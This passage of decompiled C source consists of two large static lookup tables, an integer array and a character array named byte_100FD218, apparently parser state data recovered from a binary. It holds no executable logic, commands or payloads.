  51,
  50,
  238,
  313,
  594,
  594,
  594,
  561,
  578,
  469,
  65,
  259,
  351,
  258,
  411,
  624,
  623,
  621,
  620,
  332,
  576,
  575,
  240,
  560,
  568,
  520,
  411,
  341,
  237,
  414,
  624,
  623,
  598,
  591,
  585,
  542,
  519,
  171,
  602,
  95,
  68,
  414,
  624,
  623,
  624,
  623,
  38,
  877,
  506,
  507,
  602,
  88,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  532,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  411,
  579,
  398,
  531,
  237,
  621,
  620,
  388,
  625,
  500,
  206,
  167,
  396,
  233,
  312,
  414,
  387,
  569,
  492,
  216,
  621,
  620,
  566,
  622,
  602,
  74,
  533,
  210,
  491,
  591,
  585,
  548,
  621,
  620,
  621,
  620,
  300,
  598,
  466,
  481,
  67,
  603,
  35,
  622,
  601,
  604,
  547,
  6,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  601,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  411,
  184,
  409,
  528,
  580,
  580,
  551,
  962,
  186,
  419,
  2,
  353,
  259,
  351,
  258,
  414,
  409,
  411,
  580,
  580,
  44,
  411,
  544,
  240,
  602,
  94,
  190,
  7,
  62,
  591,
  585,
  598,
  414,
  350,
  607,
  493,
  414,
  409,
  317,
  580,
  580,
  602,
  95,
  496,
  565,
  602,
  80,
  203,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  535,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  202,
  564,
  293,
  511,
  49,
  562,
  46,
  147,
  411,
  394,
  183,
  563,
  549,
  505,
  549,
  174,
  409,
  322,
  580,
  580,
  39,
  561,
  37,
  414,
  624,
  623,
  192,
  473,
  383,
  591,
  585,
  474,
  602,
  80,
  601,
  504,
  544,
  560,
  364,
  402,
  210,
  421,
  952,
  361,
  952,
  365,
  201,
  144,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  559,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  601,
  232,
  264,
  272,
  321,
  374,
  484,
  510,
  146,
  342,
  146,
  328,
  425,
  485,
  407,
  576,
  575,
  622,
  621,
  620,
  49,
  168,
  46,
  147,
  353,
  546,
  491,
  204,
  240,
  591,
  585,
  421,
  951,
  549,
  951,
  549,
  168,
  429,
  67,
  390,
  343,
  622,
  434,
  307,
  423,
  338,
  360,
  391,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  601,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  34,
  318,
  425,
  237,
  21,
  359,
  273,
  411,
  167,
  411,
  276,
  411,
  540,
  411,
  422,
  13,
  318,
  619,
  618,
  617,
  622,
  275,
  414,
  336,
  414,
  622,
  414,
  622,
  414,
  591,
  585,
  602,
  69,
  602,
  97,
  602,
  100,
  602,
  98,
  631,
  629,
  334,
  475,
  475,
  367,
  319,
  148,
  327,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  411,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  411,
  331,
  414,
  411,
  49,
  276,
  46,
  147,
  569,
  406,
  216,
  602,
  106,
  573,
  573,
  414,
  354,
  524,
  414,
  411,
  622,
  411,
  224,
  4,
  602,
  104,
  605,
  602,
  108,
  591,
  585,
  622,
  20,
  375,
  414,
  167,
  414,
  215,
  144,
  470,
  239,
  167,
  225,
  602,
  109,
  602,
  134,
  18,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  411,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  411,
  276,
  414,
  12,
  459,
  276,
  171,
  411,
  16,
  223,
  189,
  602,
  135,
  354,
  170,
  414,
  622,
  630,
  2,
  411,
  622,
  540,
  414,
  143,
  602,
  61,
  359,
  132,
  622,
  591,
  585,
  602,
  105,
  458,
  414,
  23,
  622,
  446,
  326,
  23,
  538,
  622,
  325,
  602,
  103,
  427,
  530,
  309,
  56,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  411,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  411,
  264,
  414,
  411,
  276,
  359,
  219,
  157,
  214,
  357,
  366,
  602,
  96,
  522,
  521,
  414,
  622,
  358,
  414,
  622,
  622,
  411,
  613,
  612,
  602,
  102,
  142,
  602,
  77,
  591,
  585,
  529,
  540,
  231,
  426,
  308,
  414,
  622,
  622,
  468,
  521,
  324,
  601,
  257,
  263,
  602,
  99,
  622,
  56,
  45,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  411,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  264,
  264,
  414,
  411,
  213,
  209,
  544,
  544,
  207,
  611,
  28,
  602,
  138,
  50,
  238,
  622,
  622,
  381,
  414,
  503,
  140,
  323,
  222,
  274,
  622,
  590,
  589,
  602,
  137,
  591,
  585,
  629,
  334,
  606,
  30,
  622,
  571,
  236,
  601,
  601,
  130,
  496,
  601,
  453,
  451,
  288,
  286,
  587,
  586,
  57,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  411,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  313,
  588,
  411,
  414,
  411,
  264,
  410,
  129,
  595,
  400,
  27,
  376,
  602,
  136,
  128,
  165,
  479,
  414,
  282,
  414,
  622,
  622,
  411,
  622,
  622,
  411,
  602,
  76,
  602,
  93,
  591,
  585,
  188,
  372,
  368,
  125,
  476,
  414,
  261,
  160,
  414,
  171,
  124,
  472,
  123,
  15,
  602,
  92,
  450,
  602,
  75,
  47,
  583,
  582,
  584,
  584,
  54,
  54,
  55,
  55,
  55,
  55,
  464,
  53,
  53,
  53,
  53,
  52,
  52,
  51,
  51,
  51,
  50,
  238,
  43,
  405,
  264,
  3,
  558,
  264,
  545,
  415,
  623,
  159,
  541,
  158,
  539,
  278,
  25,
  461,
  121,
  622,
  408,
  622,
  622,
  622,
  24,
  43,
  405,
  622,
  3,
  622,
  622,
  120,
  415,
  623,
  11,
  456,
  411,
  156,
  452,
  403,
  509,
  277,
  118,
  408,
  489,
  113,
  205,
  449,
  271,
  567,
  221,
  414,
  269,
  267,
  155,
  622,
  622,
  111,
  411,
  622,
  602,
  95,
  403,
  622,
  411,
  110,
  10,
  622,
  622,
  40,
  41,
  534,
  567,
  414,
  64,
  264,
  42,
  413,
  412,
  414,
  601,
  596,
  602,
  91,
  445,
  436,
  150,
  435,
  602,
  90,
  622,
  265,
  40,
  41,
  337,
  242,
  411,
  191,
  333,
  42,
  413,
  412,
  398,
  420,
  596,
  316,
  622,
  399,
  260,
  107,
  230,
  414,
  594,
  594,
  594,
  593,
  592,
  14,
  220,
  411,
  602,
  101,
  240,
  622,
  43,
  405,
  362,
  3,
  149,
  315,
  626,
  415,
  623,
  127,
  414,
  594,
  594,
  594,
  593,
  592,
  14,
  622,
  408,
  602,
  89,
  411,
  181,
  33,
  405,
  463,
  3,
  411,
  264,
  462,
  415,
  623,
  616,
  615,
  614,
  355,
  414,
  403,
  417,
  416,
  622,
  408,
  414,
  622,
  622,
  602,
  87,
  567,
  418,
  627,
  622,
  602,
  86,
  8,
  241,
  180,
  126,
  255,
  600,
  178,
  403,
  240,
  208,
  455,
  395,
  294,
  444,
  40,
  41,
  297,
  567,
  248,
  622,
  296,
  42,
  413,
  412,
  247,
  622,
  596,
  244,
  622,
  30,
  60,
  31,
  243,
  430,
  624,
  623,
  292,
  40,
  41,
  622,
  295,
  145,
  622,
  601,
  42,
  413,
  412,
  622,
  622,
  596,
  393,
  622,
  397,
  599,
  59,
  235,
  622,
  594,
  594,
  594,
  593,
  592,
  14,
  218,
  291,
  622,
  36,
  344,
  305,
  304,
  303,
  179,
  301,
  411,
  567,
  454,
  557,
  173,
  185,
  622,
  594,
  594,
  594,
  593,
  592,
  14,
  411,
  29,
  414,
  151,
  289,
  246,
  523,
  411,
  196,
  195,
  335,
  602,
  85,
  411,
  245,
  414,
  526,
  392,
  543,
  411,
  596,
  287,
  414,
  285,
  602,
  72,
  537,
  153,
  414,
  466,
  411,
  602,
  71,
  154,
  414,
  411,
  152,
  602,
  84,
  386,
  536,
  329,
  411,
  602,
  83,
  414,
  518,
  280,
  411,
  513,
  414,
  594,
  594,
  594,
  602,
  82,
  517,
  414,
  311,
  602,
  81,
  411,
  514,
  414,
  512,
  131,
  602,
  70,
  229,
  228,
  227,
  494,
  602,
  17,
  411,
  488,
  414,
  259,
  346,
  249,
  389,
  487,
  486,
  314,
  164,
  602,
  79,
  310,
  240,
  414,
  373,
  480,
  163,
  262,
  371,
  414,
  162,
  369,
  602,
  78,
  212,
  478,
  26,
  477,
  602,
  9,
  161,
  467,
  363,
  141,
  122,
  339,
  187,
  119,
  457,
  348,
  117,
  347,
  116,
  115,
  114,
  448,
  112,
  182,
  320,
  22,
  433,
  19,
  432,
  431,
  63,
  428,
  610,
  193,
  298,
  597,
  574,
  572,
  404,
  555,
  552,
  290,
  281,
  510,
  499,
  498,
  497,
  495,
  380,
  356,
  460,
  256,
  250,
  345,
  447,
  306,
  5,
  570,
  550,
  299,
  211,
  370,
  401,
  550,
  508,
  502,
  501,
  490,
  527,
  525,
  483,
  238,
  0
}; // weak
char byte_100FD218[1544] =
{
  '\x13',
  '\xDE',
  '\xDF',
  '\xE0',
  '\xE1',
  '\x18',
  '\x01',
  '\x1A',
  'M',
  'N',
  'O',
  'P',
  '\x0F',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  'q',
  '\x16',
  '\x1A',
  '\x1B',
  'u',
  '\x1A',
  '1',
  '2',
  'Q',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x17',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '^',
  'v',
  '\x13',
  '\x96',
  '\x16',
  '\x19',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\xA5',
  '^',
  '_',
  '`',
  '^',
  'v',
  'c',
  'd',
  'e',
  '\xAE',
  '\xAF',
  '1',
  '2',
  '\x16',
  '\x17',
  '`',
  '6',
  'n',
  'c',
  'd',
  'e',
  '\a',
  '\b',
  '\x1A',
  '\x1B',
  '\x10',
  'i',
  'j',
  'k',
  'n',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  'q',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x10',
  '\\',
  'C',
  'b',
  '\x18',
  '`',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f',
  '\x19',
  '<',
  'm',
  '>',
  '\\',
  '\x96',
  'm',
  '\x96',
  '\x19',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f',
  'V',
  'W',
  '1',
  '2',
  't',
  '\xA5',
  'm',
  '\xA5',
  '^',
  '_',
  'v',
  'a',
  '\xAA',
  '\xAB',
  '\xAE',
  '\xAF',
  '\x80',
  '<',
  'h',
  '>',
  'j',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\v',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x15',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\xD7',
  '`',
  '\x96',
  'B',
  'c',
  'd',
  'e',
  '\x16',
  '\x96',
  '\x8A',
  'v',
  '\x1A',
  '\x1B',
  '\xA1',
  '\xA2',
  'n',
  'g',
  '\xA5',
  '\xE7',
  '\xE8',
  '\x17',
  '1',
  '2',
  '\xA5',
  '\x18',
  '9',
  '\x1A',
  ' ',
  '\xAA',
  '\xAB',
  'p',
  '^',
  'r',
  's',
  '?',
  'b',
  ')',
  '\xB9',
  '\xBA',
  'v',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\f',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x81',
  '\x82',
  '\x83',
  '\x1C',
  '\x17',
  'd',
  '\x19',
  'i',
  'j',
  'k',
  '\x96',
  '\x1A',
  '\x1B',
  '^',
  '_',
  '\xA9',
  '\xAA',
  '\xAB',
  't',
  ',',
  '\x17',
  '.',
  '\x96',
  '\xE7',
  '\xE8',
  '\xA5',
  '\x1A',
  '\x1B',
  '^',
  '1',
  '2',
  '\x17',
  '9',
  '\x19',
  '\xAE',
  '\xAF',
  '\x16',
  '\xA5',
  '\x1A',
  '\x1B',
  '\x1A',
  '\x1B',
  '\x88',
  '\x8A',
  'a',
  'b',
  '\xAE',
  '\xAF',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x17',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x96',
  '\x17',
  '\xD8',
  '\x17',
  '\xE8',
  '^',
  '_',
  '\xDD',
  '\x96',
  '\x17',
  '\xA0',
  '\x19',
  '\xD6',
  '\xD7',
  '\xA3',
  '\xA5',
  'X',
  '\xA6',
  '\xA7',
  '\xA8',
  '^',
  '_',
  '\x17',
  '\xA5',
  '\xAE',
  '\xAF',
  'X',
  '\xA0',
  '\x96',
  '1',
  '2',
  'x',
  '^',
  '_',
  '^',
  '_',
  '\x9E',
  '\x1A',
  '9',
  '\xA1',
  '\xA2',
  'q',
  '\x88',
  '\xA5',
  '\xC2',
  'u',
  'x',
  '\x16',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\xC2',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x96',
  '\x17',
  'p',
  '\x17',
  'r',
  's',
  '\x19',
  '\x8E',
  '\x8F',
  '\x90',
  '\x91',
  '\xDA',
  'i',
  'j',
  'k',
  '\xA5',
  'p',
  '\x96',
  'r',
  's',
  '\x16',
  '\x96',
  '\xA6',
  't',
  '\xAE',
  '\xAF',
  '\x16',
  'L',
  '\xEB',
  '1',
  '2',
  '^',
  '\xA5',
  '\xF0',
  '\xAC',
  '\xAD',
  '\xA5',
  'p',
  '\x9B',
  'r',
  's',
  '\xAE',
  '\xAF',
  '\xB5',
  '\v',
  '\xAE',
  '\xAF',
  '\x16',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\xCD',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\xA0',
  '\x17',
  '\xE2',
  '\x17',
  '\xDE',
  '\f',
  '\xE0',
  '\xE1',
  '\x96',
  '\xD8',
  '\x17',
  '\x17',
  '\x19',
  '$',
  '\x19',
  '\x19',
  'p',
  '\xDC',
  'r',
  's',
  '\x87',
  '\x1C',
  '\x89',
  '\xA5',
  '\x1A',
  '\x1B',
  'w',
  '\x1E',
  '3',
  '1',
  '2',
  '\"',
  '\xAE',
  '\xAF',
  '\xC2',
  ':',
  '\xA6',
  ',',
  '\xE5',
  '.',
  '\xA0',
  '\x16',
  '\x17',
  '\xEA',
  '\x19',
  '0',
  '\xCE',
  '\xCF',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x17',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\xC2',
  '\xCD',
  '\x96',
  '\x17',
  '\xDC',
  '\x13',
  '\xB5',
  '\xB6',
  '_',
  'a',
  '_',
  'l',
  'C',
  '\xBC',
  '\xA9',
  '\xAA',
  '\xAB',
  '\xA5',
  '^',
  '_',
  '\xDE',
  '2',
  '\xE0',
  '\xE1',
  '\xDA',
  'x',
  '\x96',
  '\xA0',
  't',
  '1',
  '2',
  '\x16',
  '\x17',
  'x',
  '\x19',
  'x',
  '2',
  '\xA1',
  '\xA2',
  '\x13',
  '\x80',
  '\xA5',
  '\xF4',
  '\x16',
  '\x17',
  '\xC1',
  '\xF0',
  '\x1B',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\xC2',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x19',
  'h',
  'C',
  '\xE8',
  '\x18',
  '\x96',
  '\x17',
  '\x96',
  '\x19',
  '\x96',
  '\x96',
  '\x96',
  '\x96',
  '\x96',
  'C',
  '\x19',
  'h',
  '\a',
  '\b',
  '\t',
  '\xA5',
  'm',
  '\xA5',
  '\xF5',
  '\xA5',
  '\xA5',
  '\xA5',
  '\xA5',
  '\xA5',
  '1',
  '2',
  '\xAE',
  '\xAF',
  '\xAE',
  '\xAF',
  '\xAE',
  '\xAF',
  '\xAE',
  '\xAF',
  '\0',
  '\x01',
  '\x02',
  'i',
  'j',
  'k',
  '\xF8',
  '\xF9',
  '\xBB',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x96',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x96',
  '\xD5',
  '\xA5',
  '\x96',
  '\xDE',
  '\x96',
  '\xE0',
  '\xE1',
  '\xA6',
  '\xA7',
  '\xA8',
  '\xAE',
  '\xAF',
  '\x81',
  '\x82',
  '\xA5',
  '\x96',
  '\xA5',
  '\xA5',
  '\x96',
  '\xA5',
  '\x96',
  '\xF1',
  '#',
  '\xAE',
  '\xAF',
  '\xAE',
  '\xAE',
  '\xAF',
  '1',
  '2',
  '\xA5',
  '4',
  '\x17',
  '\xA5',
  '\x19',
  '\xA5',
  '\xCE',
  '\xCF',
  '\x17',
  '\xC5',
  '\x19',
  '\xBB',
  '\xAE',
  '\xAF',
  '\xAE',
  '\xAF',
  '\xCC',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x96',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x96',
  '\x96',
  '\xA5',
  '#',
  '\x17',
  '\x96',
  '\x19',
  '\x96',
  '\x16',
  '\xD9',
  '\x18',
  '\xAE',
  '\xAF',
  '\x96',
  '#',
  '\xA5',
  '\xA5',
  '\x90',
  '\x91',
  '\x96',
  '\xA5',
  '\x96',
  '\xA5',
  'v',
  '\xAE',
  '\xAF',
  '\x96',
  '\x16',
  '\xA5',
  '1',
  '2',
  '\xAE',
  '\xAF',
  '\x17',
  '\xA5',
  '\x19',
  '\xA5',
  '\x17',
  '\xBB',
  '\x19',
  '\x1B',
  '\xA5',
  '\xBB',
  '\xAE',
  '\xAF',
  '\x17',
  '\x17',
  '\x19',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x96',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x96',
  '\x96',
  '\xA5',
  '\x96',
  '\x96',
  '\x96',
  '\xD9',
  '\x19',
  '\xA0',
  '\x13',
  '\xD5',
  '\xAE',
  '\xAF',
  '\xBE',
  '\xBF',
  '\xA5',
  '\xA5',
  '\x1B',
  '\xA5',
  '\xA5',
  '\xA5',
  '\x96',
  '\x96',
  '\x96',
  '\xAE',
  '\xAF',
  '\'',
  '\xAE',
  '\xAF',
  '1',
  '2',
  '\x17',
  '\x96',
  '4',
  '\xFA',
  '\xFB',
  '\xA5',
  '\xA5',
  '\xA5',
  '\xBE',
  '\xBF',
  '\xBB',
  '\xC2',
  '\xF1',
  '\xC1',
  '\xAE',
  '\xAF',
  '\xA5',
  'D',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x96',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x96',
  '\x96',
  '\xA5',
  '\x96',
  '\xA0',
  '\xA0',
  '\xA6',
  '\xA6',
  '\xA0',
  '\x96',
  '\x16',
  '\xAE',
  '\xAF',
  '[',
  '\\',
  '\xA5',
  '\xA5',
  '4',
  '\xA5',
  '\x1D',
  '\x96',
  '\xD5',
  '\xF1',
  '\x17',
  '\xA5',
  '1',
  '2',
  '\xAE',
  '\xAF',
  '1',
  '2',
  '\x01',
  '\x02',
  '\xAD',
  '~',
  '\xA5',
  'V',
  'W',
  '\xC2',
  '\xC2',
  '\x16',
  '\xB5',
  '\xC2',
  '\xC1',
  '\xC1',
  '\xCD',
  '\xCD',
  'G',
  'H',
  'E',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x96',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  'b',
  '\x96',
  '\xA5',
  '\x96',
  '\x96',
  '\x96',
  '\x16',
  '\x96',
  '\x96',
  '\x16',
  '4',
  '\xAE',
  '\xAF',
  '\x16',
  'f',
  '\x14',
  '\xA5',
  'm',
  '\xA5',
  '\xA5',
  '\xA5',
  '\x96',
  '\xA5',
  '\xA5',
  '\x96',
  '\xAE',
  '\xAF',
  '\xAE',
  '\xAF',
  '1',
  '2',
  '\x18',
  '\x13',
  '+',
  'h',
  ';',
  '\xA5',
  '\x8A',
  'h',
  '\xA5',
  '\x19',
  '5',
  '5',
  '\x16',
  '\x05',
  '\xAE',
  '\xAF',
  '\xC1',
  '\xAE',
  '\xAF',
  'F',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'O',
  'P',
  '\x01',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  '\\',
  '\x13',
  '\x14',
  '\x96',
  '\x16',
  '\x96',
  '\x96',
  '\x96',
  '\x1A',
  '\x1B',
  'v',
  '\x96',
  '#',
  '\x96',
  '\x96',
  'L',
  '\x1B',
  'l',
  '\xA5',
  '%',
  '\xA5',
  '\xA5',
  '\xA5',
  'L',
  '\x13',
  '\x14',
  '\xA5',
  '\x16',
  '\xA5',
  '\xA5',
  '\x7F',
  '\x1A',
  '\x1B',
  '\x16',
  '\x01',
  '\x96',
  '\x10',
  '\x14',
  '8',
  '\x96',
  '\x96',
  'w',
  '%',
  '\x96',
  'w',
  '\xA0',
  '\xC1',
  '\x96',
  'B',
  '\xC1',
  '\xA5',
  '\x96',
  '\x96',
  'y',
  '\xA5',
  '\xA5',
  'l',
  '\x96',
  '\xA5',
  '\xAE',
  '\xAF',
  '8',
  '\xA5',
  '\x96',
  '\x7F',
  '\x16',
  '\xA5',
  '\xA5',
  'V',
  'W',
  'X',
  'B',
  '\xA5',
  '\x10',
  '\x96',
  ']',
  '^',
  '_',
  '\xA5',
  '\xC2',
  'b',
  '\xAE',
  '\xAF',
  '\x80',
  '\x17',
  '\x0F',
  '\x17',
  '\xAE',
  '\xAF',
  '\xA5',
  '\x96',
  'V',
  'W',
  'A',
  '\x8C',
  '\x96',
  '\x16',
  '\x03',
  ']',
  '^',
  '_',
  '\xD8',
  '\x04',
  'b',
  '\xFC',
  '\xA5',
  '\xDD',
  '\x96',
  '\xA4',
  '\xB4',
  '\xA5',
  '\x81',
  '\x82',
  '\x83',
  '\x84',
  '\x85',
  '\x86',
  '\xC1',
  '\x96',
  '\xAE',
  '\xAF',
  't',
  '\xA5',
  '\x13',
  '\x14',
  '\x96',
  '\x16',
  '\xF9',
  '\xFC',
  '\x95',
  '\x1A',
  '\x1B',
  '\xB4',
  '\xA5',
  '\x81',
  '\x82',
  '\x83',
  '\x84',
  '\x85',
  '\x86',
  '\xA5',
  '%',
  '\xAE',
  '\xAF',
  '\x96',
  '\x06',
  '\x13',
  '\x14',
  '\x96',
  '\x16',
  '\x96',
  '\x96',
  '\x96',
  '\x1A',
  '\x1B',
  '\x95',
  '\x95',
  '\r',
  '\x96',
  '\xA5',
  '8',
  '\x95',
  '\x9F',
  '\xA5',
  '%',
  '\xA5',
  '\xA5',
  '\xA5',
  '\xAE',
  '\xAF',
  'B',
  '\x92',
  '\x93',
  '\xA5',
  '\xAE',
  '\xAF',
  '\x19',
  '\x98',
  '\x97',
  '\x9A',
  '\x96',
  '\xC2',
  '\x97',
  '8',
  't',
  '\xA0',
  '\x96',
  '{',
  '\xCA',
  '\x96',
  'V',
  'W',
  '\xC7',
  'B',
  '\xC1',
  '\xA5',
  '\xC8',
  ']',
  '^',
  '_',
  '\x96',
  '\xA5',
  'b',
  '\x96',
  '\xA5',
  '~',
  '\x16',
  '|',
  '\x96',
  '\x96',
  '\x1A',
  '\x1B',
  '\x96',
  'V',
  'W',
  '\xA5',
  '\xC9',
  '\x96',
  '\xA5',
  '\xC2',
  ']',
  '^',
  '_',
  '\xA5',
  '\xA5',
  'b',
  '\x96',
  '\xA5',
  'z',
  '\xCB',
  '}',
  '\xE3',
  '\xA5',
  '\x81',
  '\x82',
  '\x83',
  '\x84',
  '\x85',
  '\x86',
  '\x05',
  '\x96',
  '\xA5',
  '\x87',
  '\xDA',
  '\n',
  '\v',
  '\f',
  '\r',
  '\x0E',
  '\x96',
  'B',
  '\x11',
  '\x9D',
  'v',
  '\x9D',
  '\xA5',
  '\x81',
  '\x82',
  '\x83',
  '\x84',
  '\x85',
  '\x86',
  '\x96',
  'h',
  '\xA5',
  '\x1F',
  '\xD2',
  '!',
  '\xB0',
  '\x96',
  'V',
  'W',
  '\xF7',
  '\xAE',
  '\xAF',
  '\x96',
  '*',
  '\xA5',
  '^',
  'y',
  '\xD3',
  '\x96',
  'b',
  '\xD2',
  '\xA5',
  '\xD2',
  '\xAE',
  '\xAF',
  '\xD3',
  '7',
  '\xA5',
  '9',
  '\x96',
  '\xAE',
  '\xAF',
  '=',
  '\xA5',
  '\x96',
  '@',
  '\xAE',
  '\xAF',
  'h',
  '\xD3',
  '/',
  '\x96',
  '\xAE',
  '\xAF',
  '\xA5',
  '\xB0',
  '\xB0',
  '\x96',
  'g',
  '\xA5',
  '\x81',
  '\x82',
  '\x83',
  '\xAE',
  '\xAF',
  '\xB8',
  '\xA5',
  '\xB3',
  '\xAE',
  '\xAF',
  '\x96',
  '\xB2',
  '\xA5',
  '\xB0',
  '\x16',
  '\xAE',
  '\xAF',
  '\xE6',
  '\\',
  '\xE6',
  '\xB8',
  '\xAE',
  '\xAF',
  '\x96',
  '\xB0',
  '\xA5',
  'i',
  'j',
  'k',
  '\x96',
  '\xB0',
  '\xB0',
  'o',
  '\x9C',
  '\xAE',
  '\xAF',
  '\xB3',
  't',
  '\xA5',
  '\x12',
  '\x9D',
  '\x9C',
  '\xEE',
  '\x9D',
  '\xA5',
  '\x9C',
  '-',
  '\xAE',
  '\xAF',
  '\x9D',
  '\x9D',
  '\x87',
  '\xEF',
  '\xAE',
  '\xAF',
  '\x9C',
  '\xBD',
  '\x9D',
  'D',
  '\xBD',
  '\x8B',
  '\xDB',
  '\x16',
  '\xC7',
  '\x9D',
  '\xC0',
  '\x12',
  '\xC0',
  '\xC0',
  '\xC0',
  '\xC7',
  '\xBD',
  '\xDB',
  '\x9D',
  '\xF3',
  '(',
  '\xF3',
  '\x9D',
  '\x9D',
  '\xF6',
  '&',
  '\x99',
  '\xC4',
  '\xC6',
  '\xA6',
  '\xE9',
  '\xE9',
  '\xE4',
  '\xB1',
  '\xB1',
  '\xD1',
  '\xB1',
  '\xB6',
  '\xB1',
  '\xA6',
  '\xB1',
  '\xA6',
  '\xB2',
  '\xF2',
  '\xC7',
  '\xF2',
  '\xD1',
  '\xD1',
  '\xC7',
  '\x94',
  '\xC4',
  '\xA6',
  '\xD0',
  '\xC3',
  '\xEC',
  '\xED',
  '\xBF',
  '\xD0',
  '\xB7',
  '\xB7',
  '\xB7',
  '\xBA',
  '\xAE',
  '\xAE',
  '\xBA',
  '\\',
  '\0'
